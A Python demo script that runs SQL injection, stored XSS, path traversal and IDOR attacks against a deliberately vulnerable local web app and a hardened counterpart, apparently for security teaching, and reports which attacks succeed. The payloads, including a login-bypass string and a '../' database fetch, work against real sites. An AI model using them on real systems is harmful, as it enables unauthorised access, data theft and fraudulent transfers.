import requests

VULN = "http://127.0.0.1:5001"
SEC  = "http://127.0.0.1:5002"

def line(msg): print("\n" + msg)

def test_sqli(base):
    data = {'username':'alice', 'password':"' OR '1'='1"}
    r = requests.post(f"{base}/login", data=data, timeout=5)
    return "Welcome" in r.text

def login(base, user, pwd):
    return requests.post(f"{base}/login", data={'username':user,'password':pwd}, timeout=5)

def test_xss_vuln():
    s = requests.Session()
    payload = "<script>alert('XSS')</script>"
    s.post(f"{VULN}/comments", data={'username':'attacker','comment':payload}, timeout=5)
    r = s.get(f"{VULN}/comments", timeout=5)
    return payload in r.text

def test_xss_secure_blocked():
    s = requests.Session()
    payload = "<script>alert('XSS')</script>"
    r = s.post(f"{SEC}/comments", data={'username':'attacker','comment':payload}, timeout=5)
    return r.status_code in (400, 403)

def test_traversal(base, filename):
    r = requests.get(f"{base}/download", params={'file': filename}, timeout=5)
    return r.status_code

def test_idor_view_vuln():
    s = requests.Session()
    s.post(f"{VULN}/login", data={'username':'alice','password':'password123'}, timeout=5)
    r = s.get(f"{VULN}/account", params={'user_id':2}, timeout=5)
    return "Account for bob" in r.text

def test_idor_view_secure():
    s = requests.Session()
    s.post(f"{SEC}/login", data={'username':'alice','password':'password123'}, timeout=5)
    r = s.get(f"{SEC}/account", params={'user_id':2}, timeout=5)
    return "bob" in r.text  # should be False

def test_idor_transfer_vuln():
    s = requests.Session()
    s.post(f"{VULN}/login", data={'username':'alice','password':'password123'}, timeout=5)
    r = s.post(f"{VULN}/transfer", data={'from_user_id':2,'to_user_id':1,'amount':5}, timeout=5)
    return r.status_code == 200

def test_idor_transfer_secure():
    s = requests.Session()
    s.post(f"{SEC}/login", data={'username':'alice','password':'password123'}, timeout=5)
    r = s.post(f"{SEC}/transfer", data={'to_user_id':2,'amount':5}, timeout=5)  # from_user taken from session
    return r.status_code == 200

def main():
    print("=== Auto Exploit Demo ===")
    # SQLi
    line("[+] SQL Injection")
    print(f" Vulnerable app: {'SUCCESS' if test_sqli(VULN) else 'BLOCKED'}")
    print(f" Secure app:     {'SUCCESS' if test_sqli(SEC) else 'BLOCKED ✅'}")

    # XSS
    line("[+] Stored XSS")
    print(f" Vulnerable app: {'SUCCESS' if test_xss_vuln() else 'BLOCKED'}")
    print(f" Secure app:     {'BLOCKED ✅' if test_xss_secure_blocked() else 'NOT BLOCKED'}")

    # Path Traversal
    line("[+] Path Traversal")
    status_v = test_traversal(VULN, '../vuln.db')
    status_s = test_traversal(SEC, '../secure.db')
    print(f" Vulnerable app: {'SUCCESS' if status_v != 404 else 'BLOCKED'} (status {status_v})")
    print(f" Secure app:     {'BLOCKED ✅' if status_s == 404 else 'NOT BLOCKED'} (status {status_s})")

    # IDOR
    line("[+] IDOR (Account view & Transfer)")
    print(f" View another user (vuln): {'SUCCESS' if test_idor_view_vuln() else 'BLOCKED'}")
    print(f" View another user (secure): {'BROKEN' if test_idor_view_secure() else 'BLOCKED ✅'}")
    print(f" Transfer from other account (vuln): {'SUCCESS' if test_idor_transfer_vuln() else 'BLOCKED'}")
    print(f" Transfer uses session source (secure): {'SUCCESS ✅' if test_idor_transfer_secure() else 'FAILED'}")

if __name__ == '__main__':
    main()
